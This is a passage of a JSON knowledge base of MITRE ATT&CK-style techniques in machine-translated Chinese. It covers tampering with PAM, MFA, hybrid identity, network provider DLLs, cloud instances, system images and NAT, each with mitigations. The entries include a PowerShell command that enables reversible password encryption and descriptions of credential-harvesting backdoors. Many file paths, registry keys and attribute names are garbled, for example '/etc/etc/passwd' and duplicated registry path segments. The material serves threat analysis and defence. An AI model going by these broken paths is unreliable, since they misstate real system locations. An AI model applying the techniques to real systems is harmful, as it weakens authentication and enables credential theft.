        "name": "Defense Evasion"
      },
      {
        "id": "TA0003",
        "name": "Persistence"
      }
    ],
    "technique": "Modify Authentication Process",
    "version": "2.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以修改可插入身份验证模块（PAM）以访问用户凭据，或启用原本无理的对帐户的访问。PAM是一个模块化的配置文件，库和可执行文件的系统系统，可指导许多服务的身份验证。最常见的身份验证模块是"
        },
        {
          "type": "code",
          "content": " pam_unix.so "
        },
        {
          "type": "text",
          "content": "，它在"
        },
        {
          "type": "code",
          "content": "/etc/etc/passwd "
        },
        {
          "type": "text",
          "content": "和<code>/etc/etc/etcs </code中检索，集合和验证帐户身份验证信息>。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以修改PAM系统的组件以创建后门。PAM组件，例如"
        },
        {
          "type": "code",
          "content": " pam_unix.so "
        },
        {
          "type": "text",
          "content": "，可以修补以接受任意的对手提供的值作为合法的凭据。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对PAM系统的恶意修改也可能被滥用以窃取凭据。对手可以用代码感染PAM资源以收获用户凭据，因为与PAM组件交换的值可能是普通文本，因为PAM不存储密码。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1032",
        "name": "多因素身份验证",
        "description": [
          [
            {
              "type": "text",
              "content": "将多因素身份验证（MFA）整合为组织政策的一部分，可以大大降低对手获得对有效凭证的控制的风险，这些凭据可用于其他策略，例如初始访问，横向移动和收集信息。"
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "限制对根帐户的访问，并防止用户通过适当的特权分离（Ex selinux，grsecurity，apparmor等）修改PAM组件，并限制特权升级机会。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1556.004",
    "name": "Network Device Authentication",
    "tactics": [
      {
        "id": "TA0006",
        "name": "Credential Access"
      },
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      },
      {
        "id": "TA0003",
        "name": "Persistence"
      }
    ],
    "technique": "Modify Authentication Process",
    "version": "2.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以使用补丁系统图像来硬编码操作系统中的密码，从而绕过网络设备上本地帐户的本地身份验证机制。"
        }
      ],
      [
        {
          "type": "text",
          "content": "修改系统映像可能包括向操作系统的网络设备的植入代码，以使用特定密码为对手提供访问权限。修改包括一个特定的密码，该密码通过补丁植入了操作系统图像。经过身份验证尝试后，插入的代码将首先检查以查看用户输入是否是密码。如果是这样，将授予访问权限。否则，植入的代码将通过凭据来验证潜在有效的凭据。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1032",
        "name": "多因素身份验证",
        "description": [
          [
            {
              "type": "text",
              "content": "为用户和特权帐户使用多因素身份验证。大多数嵌入式网络设备都支持TACACS+和/或半径。遵循供应商处方的最佳实践，以硬化访问控制。"
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "遵循最少的特权原则，将管理员帐户限制在尽可能少的个人中。防止管理员和特权帐户系统之间的凭据重叠，特别是在网络和非网络平台之间，例如服务器或端点。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1556.005",
    "name": "Reversible Encryption",
    "tactics": [
      {
        "id": "TA0006",
        "name": "Credential Access"
      },
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      },
      {
        "id": "TA0003",
        "name": "Persistence"
      }
    ],
    "technique": "Modify Authentication Process",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会滥用Active Directory认证加密属性，以获取Windows系统上的凭据。"
        },
        {
          "type": "code",
          "content": "允许Reverversible passwordecryption "
        },
        {
          "type": "text",
          "content": "属性指定帐户的可逆密码加密是启用还是禁用。默认情况下，该属性被禁用（取而代之的是将用户凭据作为单向哈希功能的输出），除非旧版或其他软件都需要它，否则不应启用。"
        }
      ],
      [
        {
          "type": "text",
          "content": "如果启用该属性并在启用密码后更改其密码，则对手可能能够在启用属性后获取创建/更改的密码的明文。要解密密码，对手需要四个组件："
        }
      ],
      [
        {
          "type": "text",
          "content": "有了这些信息，对手可能能够重现加密密钥，然后解密加密的密码值。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以通过本地组策略编辑器，用户属性，细粒密码策略（FGPP）或通过Activedirectory PowerShell模块将此属性设置为各种范围。例如，如果域功能级别设置为“ Windows Server 2008”或更高版本，则对手可以实现并将FGPP应用于用户或组。在PowerShell中，对手可以使用类似于"
        },
        {
          "type": "code",
          "content": " Set -Aduser -AllowReversible passwordectryption $ true "
        },
        {
          "type": "text",
          "content": "的命令对用户设置进行关联更改。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1027",
        "name": "密码策略",
        "description": [
          [
            {
              "type": "text",
              "content": "确保"
            },
            {
              "type": "code",
              "content": "允许Reverversible passwordectigning "
            },
            {
              "type": "text",
              "content": "将属性设置为禁用，除非有应用程序要求。"
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "审计域和本地帐户以及其许可级别通常会寻找可以通过获得特权帐户的凭据来获得广泛访问的情况。如果启用了默认帐户，或者创建尚未授权的新本地帐户，这些审核也应包括在内。遵循企业网络设计和管理的最佳实践，以限制行政层的特权帐户使用。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1556.006",
    "name": "Multi-Factor Authentication",
    "tactics": [
      {
        "id": "TA0006",
        "name": "Credential Access"
      },
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      },
      {
        "id": "TA0003",
        "name": "Persistence"
      }
    ],
    "technique": "Modify Authentication Process",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会禁用或修改多因素身份验证（MFA）机制，以使持续访问受损害的帐户访问。"
        }
      ],
      [
        {
          "type": "text",
          "content": "一旦对手通过损害缺乏MFA的帐户或采用MFA旁路方法（例如多因素身份验证请求生成生成）来获得对网络的访问，对手可能会利用其修改或完全禁用MFA防御的访问权限。这可以通过滥用合法功能来完成，例如将用户排除在Azure AD条件访问策略之外，注册新的但脆弱的/对手控制的MFA方法，或者通过手动修补MFA程序和配置文件来绕过预期的功能。"
        }
      ],
      [
        {
          "type": "text",
          "content": "例如，将Windows Hosts文件（"
        },
        {
          "type": "code",
          "content": " c：\\ Windows \\ System32 \\ eetc \\ etc hosts "
        },
        {
          "type": "text",
          "content": "）修改以将MFA调用重定向到Localhost而不是MFA服务器可能会导致MFA进程失败。如果制定“失败的打开”策略，则可以在无执行MFA的情况下授予任何其他成功的身份验证尝试。"
        }
      ],
      [
        {
          "type": "text",
          "content": "根据对手的范围，目标和特权，MFA防御可能会用于单个帐户或与较大群体相关的所有帐户，例如受害者网络环境中的所有域帐户。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "审计",
        "description": [
          [
            {
              "type": "text",
              "content": "查看MFA操作以及身份验证日志，以确保基于MFA的登录按预期运行。查看用户帐户，以确保所有帐户都启用了MFA。"
            }
          ]
        ]
      },
      {
        "id": "M1032",
        "name": "多因素身份验证",
        "description": [
          [
            {
              "type": "text",
              "content": "确保对现有，停用或休眠的帐户和设备的MFA和MFA政策和要求正确实施。如果可能的话，请考虑在发生严重错误的情况下将MFA解决方案配置为“失败”，而不是授予访问。"
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "用户帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "确保实施适当的政策，以决定用户帐户的MFA的安全入学和停用。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1556.007",
    "name": "Hybrid Identity",
    "tactics": [
      {
        "id": "TA0006",
        "name": "Credential Access"
      },
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      },
      {
        "id": "TA0003",
        "name": "Persistence"
      }
    ],
    "technique": "Modify Authentication Process",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以修补，修改或以其他方式进行后门云身份验证过程，这些过程与本地用户身份相关，以绕过典型的身份验证机制，访问凭据，并启用对帐户的持续访问。"
        }
      ],
      [
        {
          "type": "text",
          "content": "许多组织维护在本地和基于云的环境之间共享的混合用户和设备身份。这些可以通过多种方式维护。例如，Azure AD包括三个用于同步Active Directory和Azure AD之间的身份的选项："
        }
      ],
      [
        {
          "type": "list",
          "content": "密码哈希同步（PHS），其中特权本地帐户同步了Active Directory和Azure AD之间的用户密码哈希，从而使Azure AD的身份验证完全在云中进行"
        },
        {
          "type": "list",
          "content": "通过身份验证（PTA），将Azure AD身份验证尝试转发给本地PTA代理，该代理验证了针对Active Directory的凭据"
        },
        {
          "type": "list",
          "content": "Active Directory Federation Services（AD FS），其中Active Directory和Azure AD之间建立了信任关系"
        }
      ],
      [
        {
          "type": "text",
          "content": "AD FS也可以与其他SaaS和云平台（如AWS和GCP）一起使用，AWS和GCP将把身份验证过程移交给AD FS并接收包含混合用户的身份和特权的令牌。"
        }
      ],
      [
        {
          "type": "text",
          "content": "通过修改与混合身份相关的身份验证过程，对手可能能够建立对云资源的持续特权访问。例如，损害运行PTA代理的本地服务器的对手可以将恶意DLL注入"
        },
        {
          "type": "code",
          "content": " azureadConnectAuthenticationAgenticagentservice "
        },
        {
          "type": "text",
          "content": "处理所有尝试对Azure AD进行身份验证的尝试，以及记录用户凭证。在使用AD FS的环境中，对手可以编辑"
        },
        {
          "type": "code",
          "content": " Microsoft.IdentityServer.ServiceHost "
        },
        {
          "type": "text",
          "content": "配置文件，以加载一个恶意DLL，该恶意DLL为任何具有任何索赔的用户生成身份验证令牌定义的AD FS政策。"
        }
      ],
      [
        {
          "type": "text",
          "content": "在某些情况下，对手可能能够从云中修改混合身份身份验证过程。例如，在Azure AD租户中妥协全局管理员帐户的对手可能能够通过Web控制台注册新的PTA代理，同样允许他们作为任何用户收获凭据并将其登录到Azure AD环境中。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "审计",
        "description": [
          [
            {
              "type": "text",
              "content": "定期查看用于任何差异的混合身份解决方案。例如，查看Azure Management门户中的所有PTA代理，以识别任何不需要的或未批准的PTA代理。如果使用ADF，请在AD FS和全局汇编缓存目录中查看DLL和可执行文件，以确保它们由Microsoft签名。请注意，在某些情况下，二进制文件可能是符号签名的，这可能会导致该文件在查看文件属性时出现未签名。"
            }
          ]
        ]
      },
      {
        "id": "M1032",
        "name": "多因素身份验证",
        "description": [
          [
            {
              "type": "text",
              "content": "将多因素身份验证（MFA）整合为组织政策的一部分，可以大大降低对手获得对有效凭证的控制的风险，这些凭据可用于其他策略，例如初始访问，横向移动和收集信息。MFA也可以用于限制对云资源和API的访问。"
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "限制本地帐户，并访问了对混合身份解决方案的访问。例如，将Azure AD全局管理员帐户仅限于所需的帐户，并确保这些帐户是专用的仅云帐户而不是混合帐户。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1556.008",
    "name": "Network Provider DLL",
    "tactics": [
      {
        "id": "TA0006",
        "name": "Credential Access"
      },
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      },
      {
        "id": "TA0003",
        "name": "Persistence"
      }
    ],
    "technique": "Modify Authentication Process",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以注册恶意网络提供商动态链接库（DLL），以在身份验证过程中捕获ClearText用户凭据。网络提供商DLL允许Windows与特定的网络协议交互，还可以支持附加凭据管理功能。在登录过程中，Winlogon（交互式登录模块）通过RPC将凭据发送到本地"
        },
        {
          "type": "code",
          "content": " mpnotify.exe "
        },
        {
          "type": "text",
          "content": "过程。"
        },
        {
          "type": "code",
          "content": " mpnotify.exe "
        },
        {
          "type": "text",
          "content": "过程然后在通知登录事件发生时与已注册的凭据管理者在ClearText中共享凭据。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以配置恶意网络提供商DLL，以从"
        },
        {
          "type": "code",
          "content": " mpnotify.exe "
        },
        {
          "type": "text",
          "content": "接收凭据。一旦安装为凭证管理器（通过注册表），恶意DLL每次用户通过"
        },
        {
          "type": "code",
          "content": " nplogonnotify（）"
        },
        {
          "type": "text",
          "content": "函数登录到Windows Workstation或域上时都可以接收并保存凭据。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可能会针对已知增加登录活动和/或管理员登录活动（例如服务器和域控制器）的系统，以种植恶意网络提供商DLL为目标。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "审计",
        "description": [
          [
            {
              "type": "text",
              "content": "定期审查注册表中的新的和未知的网络提供商DLL（"
            },
            {
              "type": "code",
              "content": " hkey_local_machine \\ system \\ currentControlset \\ services \\ services \\ <networkProvidername> \\ networkProvider \\ networkProvider \\ provider \\ providerpath "
            },
            {
              "type": "text",
              "content": "）。"
            }
          ],
          [
            {
              "type": "text",
              "content": "确保仅注册有效的网络提供商DLL。这些名称可以在注册表密钥中找到"
            },
            {
              "type": "code",
              "content": " hkey_local_machine \\ system \\ currentControlset \\ currentControlset \\ control \\ networkProvider \\ order \\ order </code </code "
            },
            {
              "type": "text",
              "content": " </code>，并且在"
            },
            {
              "type": "code",
              "content": " hkey_local_machine \\ currentc ontrololset \\ currentc ontroloset controlsect ot trolsy \\ code subkey指向dll\\ services \\ <NetworkProviderName> \\ NetworkProvider "
            },
            {
              "type": "text",
              "content": "。"
            }
          ]
        ]
      },
      {
        "id": "M1028",
        "name": "操作系统配置",
        "description": [
          [
            {
              "type": "text",
              "content": "从Windows 11 22H2开始，可以通过组策略或通过配置服务提供商禁用"
            },
            {
              "type": "code",
              "content": " enablemprnotifications "
            },
            {
              "type": "text",
              "content": "策略，以防止Winlogon向网络提供商发送凭据。"
            }
          ]
        ]
      },
      {
        "id": "M1024",
        "name": "限制注册表许可",
        "description": [
          [
            {
              "type": "text",
              "content": "限制注册表权限，禁止修改敏感注册表密钥，例如"
            },
            {
              "type": "code",
              "content": " hkey_local_machine \\ system \\ currentControlset \\ control \\ control \\ networkProvider \\ order \\ order \\ order "
            },
            {
              "type": "text",
              "content": "。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1578.001",
    "name": "Create Snapshot",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Modify Cloud Compute Infrastructure",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以在云帐户中创建快照或数据备份以逃避防御。快照是现有云计算组件的时间点副本，例如虚拟机（VM），虚拟硬盘驱动器或音量。对手可以利用权限创建快照，以绕过限制，从而阻止访问现有的计算服务基础架构，这与恢复对手可以恢复到快照以逃避检测并消除其存在的证据不同，这不同。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以创建云实例，将一个或多个创建的快照安装到该实例，然后应用允许对手访问创建实例的策略，例如允许他们入站和出站SSH访问的防火墙策略。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "审计",
        "description": [
          [
            {
              "type": "text",
              "content": "通常会检查用户权限，以确保只有预期的用户才能创建快照和备份。"
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "用户帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "限制根据最少特权创建快照或备份的权限。组织应限制具有IAM角色的组织中的用户数量，该角色具有行政特权，努力减少所有永久特权的角色分配，并对IAM用户，角色和政策进行定期权利审查。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1578.002",
    "name": "Create Cloud Instance",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Modify Cloud Compute Infrastructure",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以在云帐户的计算服务中创建新实例或虚拟机（VM）以逃避防御。创建新实例可能会使对手可以绕过当前居住在帐户中的实例上存在的防火墙规则和权限。对手可以在帐户中创建一个或多个卷的快照，创建新实例，安装快照，然后应用较小的限制性安全策略来从本地系统或远程数据分期收集数据。"
        }
      ],
      [
        {
          "type": "text",
          "content": "创建新实例还可能使对手可以在环境中进行恶意活动，而不会影响当前运行实例的执行。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "审计",
        "description": [
          [
            {
              "type": "text",
              "content": "定期检查用户权限，以确保只有预期的用户才能创建新实例。"
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "用户帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "限制根据最少特权创建新实例的权限。组织应限制具有IAM角色的组织中的用户数量，该角色具有行政特权，努力减少所有永久特权的角色分配，并对IAM用户，角色和政策进行定期权利审查。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1578.003",
    "name": "Delete Cloud Instance",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Modify Cloud Compute Infrastructure",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手进行恶意活动后，可能会删除云实例，以逃避检测并消除其存在的证据。如果实例无法恢复，则删除实例或虚拟机可以删除有价值的法医文物和其他可疑行为的证据。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手还可以创建云实例，然后在实现目标后终止实例。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "审计",
        "description": [
          [
            {
              "type": "text",
              "content": "定期检查用户权限，以确保只有预期的用户才能删除新实例。"
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "用户帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "限制根据最少特权删除新实例的权限。组织应限制具有IAM角色的组织中的用户数量，该角色具有行政特权，努力减少所有永久特权的角色分配，并对IAM用户，角色和政策进行定期权利审查。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1578.004",
    "name": "Revert Cloud Instance",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Modify Cloud Compute Infrastructure",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手进行了恶意活动以逃避检测并消除其存在的证据后，他们可能会恢复对云实例的变化。在高度虚拟化的环境中，例如基于云的基础架构，可以通过通过云管理仪表板或云API恢复虚拟机（VM）或数据存储快照来完成。"
        }
      ],
      [
        {
          "type": "text",
          "content": "该技术的另一个变化是利用附加到计算实例的临时存储。大多数云提供商都提供各种类型的存储，包括持久性，本地和/或短暂的存储空间，在VM的停止/重新启动时，短暂类型经常重置。"
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "这种类型的攻击技术无法通过预防控制来轻松减轻，因为它基于对系统功能的滥用。"
      }
    ]
  },
  {
    "id": "T1578.005",
    "name": "Modify Cloud Compute Configurations",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Modify Cloud Compute Infrastructure",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以修改直接影响云计算基础架构的大小，位置和资源以逃避防御的设置。这些设置可能包括服务配额，订阅协会，范围范围的策略或其他影响可用计算的配置。这种修改可能会使对手能够滥用受害者的计算资源以实现其目标，并可能不会影响执行跑步实例和/或向受害者揭示其活动。"
        }
      ],
      [
        {
          "type": "text",
          "content": "例如，云提供商通常会通过配额限制客户对计算资源的使用。客户可以要求对这些配额进行调整以支持增加的计算需求，尽管这些调整可能需要云提供商的批准。损害云环境的对手可能会要求调整配额调整以支持其活动，例如通过使用受害者的整个配额来实现其他资源劫持而不会引起怀疑。对手也可能会通过修改限制部署虚拟机尺寸的任何范围范围的策略来增加资源的使用。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手还可以修改影响可以部署云资源的设置，例如启用未使用/不支持的云区域。在Azure环境中，获得访问全球管理员帐户的对手可能会创建新的订阅，以通过将现有的付款方式转移到受害者租户上，以部署资源或从事订阅劫持劫持。受控租户。这将使对手能够使用受害者的计算资源，而无需为受害人租户生成日志。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "审计",
        "description": [
          [
            {
              "type": "text",
              "content": "定期监视用户权限，以确保只有预期的用户才能要求配额调整或修改租户级计算设置。"
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "用户帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "限制要求配额调整或将租户级计算设置修改为仅要求的权限。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1601.001",
    "name": "Patch System Image",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Modify System Image",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以修改网络设备的操作系统，以引入新功能或削弱现有防御能力。某些网络设备是使用单片架构构建的，其中整个操作系统以及该设备的大多数功能都包含在一个文件中。对手可能会在存储中更改此文件，将在未来的启动中或在运行时内存中加载。"
        }
      ],
      [
        {
          "type": "text",
          "content": "为了更改存储中的操作系统，对手通常会使用设备操作员可用的标准过程。这可能涉及通过在网络设备上使用的典型协议下载新文件，例如TFTP，FTP，SCP或控制台连接。原始文件可以被覆盖，或者可以在其旁边写入新文件，并将设备重新配置以启动到折衷的图像。"
        }
      ],
      [
        {
          "type": "text",
          "content": "要更改内存中的操作系统，对手通常可以使用两种方法之一。首先，对手将使用原始的，未更改的运行操作系统中的本机调试命令，该命令允许他们直接修改包含运行操作系统的相关内存地址。此方法通常需要对设备的管理级别访问。"
        }
      ],
      [
        {
          "type": "text",
          "content": "在更改内存中操作系统的第二种方法中，对手将使用引导加载程序。引导加载程序是设备启动时加载的第一件软件，而该软件又将启动操作系统。对手可以使用先前植入的启动加载程序中的恶意代码（例如通过RommonKit方法）直接操作内存中运行的操作系统代码。引导加载程序中的此恶意代码为对手提供了直接内存操作的能力，从而使他们可以在运行时修补实时操作系统。"
        }
      ],
      [
        {
          "type": "text",
          "content": "通过修改存储在系统图像文件中的说明，对手可以削弱现有防御措施或设备以前没有的新功能。可能阻碍的现有防御措施的示例包括通过网络边界桥接通过网络设备身份验证，通过网络设备身份验证和周边防御措施进行加密。为对手的目的添加新功能包括钥匙扣，多跳代理和端口敲门。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手也可能会损害操作系统中的现有命令，以产生错误的输出来误导防御者。当此方法与降级系统图像结合使用时，折衷的系统命令的一个示例可能包括更改命令的输出，该输出显示了当前运行的操作系统的版本。通过修补操作系统，对手可以更改此命令，而是显示通过系统降级替换的原始更高的修订号。"
        }
      ],
      [
        {
          "type": "text",
          "content": "在存储中对操作系统进行修补时，可以在居民存储（通常是闪存的形式，是非挥发性的）中或通过TFTP启动来实现的。"
        }
      ],
      [
        {
          "type": "text",
          "content": "当在内存中而不是在存储副本上执行该技术时，此技术将无法在重新启动中生存。但是，操作系统的实时内存修改可以与RommonKit结合使用，以实现持久性。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1046",
        "name": "引导完整性",
        "description": [
          [
            {
              "type": "text",
              "content": "嵌入式网络设备的一些供应商提供加密签名，以确保启动时操作系统的完整性。按照供应商指南，实施可用的地方。"
            }
          ]
        ]
      },
      {
        "id": "M1045",
        "name": "代码签名",
        "description": [
          [
            {
              "type": "text",
              "content": "许多供应商提供了数字签名的操作系统图像，以验证其平台上使用的软件的完整性。在可能的情况下使用此功能，以防止和/或检测对手试图损害系统图像的尝试。"
            }
          ]
        ]
      },
      {
        "id": "M1043",
        "name": "凭证访问保护",
        "description": [
          [
            {
              "type": "text",
              "content": "一些嵌入式网络设备能够以普通文本或加密格式存储本地帐户的密码。根据供应商的建议，请确保始终加密本地密码。"
            }
          ]
        ]
      },
      {
        "id": "M1032",
        "name": "多因素身份验证",
        "description": [
          [
            {
              "type": "text",
              "content": "为用户和特权帐户使用多因素身份验证。大多数嵌入式网络设备都支持TACACS+和/或半径。遵循供应商处方的最佳实践，以硬化访问控制。"
            }
          ]
        ]
      },
      {
        "id": "M1027",
        "name": "密码策略",
        "description": [
          [
            {
              "type": "text",
              "content": "创建密码策略时，请参阅NIST指南。"
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "遵循最少的特权原则，将管理员帐户限制在尽可能少的个人中。防止管理员和特权帐户系统之间的凭据重叠，特别是在网络和非网络平台之间，例如服务器或端点。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1601.002",
    "name": "Downgrade System Image",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Modify System Image",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以安装网络设备的操作系统的较旧版本，以削弱安全性。网络设备上的较旧操作系统版本通常具有较弱的加密密码，通常更新/更少更新的防御功能。"
        }
      ],
      [
        {
          "type": "text",
          "content": "在嵌入式设备上，降低版本通常只需要替换存储中的操作系统文件。使用大多数嵌入式设备，这可以通过下载所需版本的操作系统文件的副本并重新配置该设备在下一个系统重新启动时从该文件启动。然后，对手可以重新启动设备以立即实现更改，或者他们可以等到系统重新启动直到系统。"
        }
      ],
      [
        {
          "type": "text",
          "content": "将系统图像降级到较旧的版本可能会使对手能够通过启用诸如弱加密之类的行为来逃避防御。可以单独完成系统图像的降低，也可以与补丁系统图像一起使用。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1046",
        "name": "引导完整性",
        "description": [
          [
            {
              "type": "text",
              "content": "嵌入式网络设备的一些供应商提供加密签名，以确保启动时操作系统的完整性。按照供应商指南，实施可用的地方。"
            }
          ]
        ]
      },
      {
        "id": "M1045",
        "name": "代码签名",
        "description": [
          [
            {
              "type": "text",
              "content": "许多供应商提供了数字签名的操作系统图像，以验证其平台上使用的软件的完整性。在可能的情况下使用此功能，以防止和/或检测对手试图损害系统图像的尝试。"
            }
          ]
        ]
      },
      {
        "id": "M1043",
        "name": "凭证访问保护",
        "description": [
          [
            {
              "type": "text",
              "content": "一些嵌入式网络设备能够以普通文本或加密格式存储本地帐户的密码。根据供应商的建议，请确保始终加密本地密码。"
            }
          ]
        ]
      },
      {
        "id": "M1032",
        "name": "多因素身份验证",
        "description": [
          [
            {
              "type": "text",
              "content": "为用户和特权帐户使用多因素身份验证。大多数嵌入式网络设备都支持TACACS+和/或半径。遵循供应商处方的最佳实践，以硬化访问控制。"
            }
          ]
        ]
      },
      {
        "id": "M1027",
        "name": "密码策略",
        "description": [
          [
            {
              "type": "text",
              "content": "创建密码策略时，请参阅NIST指南。"
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "遵循最少的特权原则，将管理员帐户限制在尽可能少的个人中。防止管理员和特权帐户系统之间的凭据重叠，特别是在网络和非网络平台之间，例如服务器或端点。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1599.001",
    "name": "Network Address Translation Traversal",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Network Boundary Bridging",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以通过修改网络设备的网络地址翻译（NAT）配置来弥合网络边界。对NAT的恶意修改可能使对手能够绕过对其他单独受信任和不受信任网络的流量路由的限制。"
        }
      ],
      [
        {
          "type": "text",
          "content": "在网络之间传递数据包的过程中，将多个网络连接在一起的网络设备（例如路由器和防火墙）可以实现NAT。执行NAT时，网络设备将重写IP地址标头的源和/或目标地址。一些网络设计需要数据包越过边界设备的NAT。一个典型的例子是内部网络利用非互联网可路由地址的环境。"
        }
      ],
      [
        {
          "type": "text",
          "content": "当对手获得对网络边界设备的控制时，他们可以利用现有的NAT配置来发送两个分开网络之间的流量，或者可以实现其自己设计的NAT配置。对于需要NAT运行的网络设计，这使对手能够克服固有的路由限制，这些路由局限性通常会阻止它们访问边框设备后面的受保护系统。对于不需要NAT的网络设计，对手可以使用地址翻译来掩盖其活动，因为更改遍历网络边界设备的数据包的地址可以使监视数据传输对后卫更具挑战性。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以使用补丁系统图像更改网络设备的操作系统，实施自己的自定义NAT机制以进一步掩盖其活动"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1043",
        "name": "凭证访问保护",
        "description": [
          [
            {
              "type": "text",
              "content": "一些嵌入式网络设备能够以普通文本或加密格式存储本地帐户的密码。根据供应商的建议，请确保始终加密本地密码。"
            }
          ]
        ]
      },
      {
        "id": "M1037",
        "name": "过滤网络流量",
        "description": [
          [
            {
              "type": "text",
              "content": "识别用于桥接网络边界的受损网络设备时，阻止流量，使用路径中未受影响的网络设备（例如防火墙或尚未受到损害的路由器）阻止恶意数据包。继续监视其他活动，并确保块确实有效。"
            }
          ]
        ]
      },
      {
        "id": "M1032",
        "name": "多因素身份验证",
        "description": [
          [
            {
              "type": "text",
              "content": "为用户和特权帐户使用多因素身份验证。大多数嵌入式网络设备都支持TACACS+和/或半径。遵循供应商处方的最佳实践，以硬化访问控制。"
            }
          ]
        ]
      },
      {
        "id": "M1027",
        "name": "密码策略",
        "description": [
          [
            {
              "type": "text",
              "content": "创建密码策略时，请参阅NIST指南。"
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "遵循最少的特权原则，将管理员帐户限制在尽可能少的个人中。防止管理员和特权帐户系统之间的凭据重叠，特别是在网络和非网络平台之间，例如服务器或端点。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1027.001",
    "name": "Binary Padding",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Obfuscated Files or Information",
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
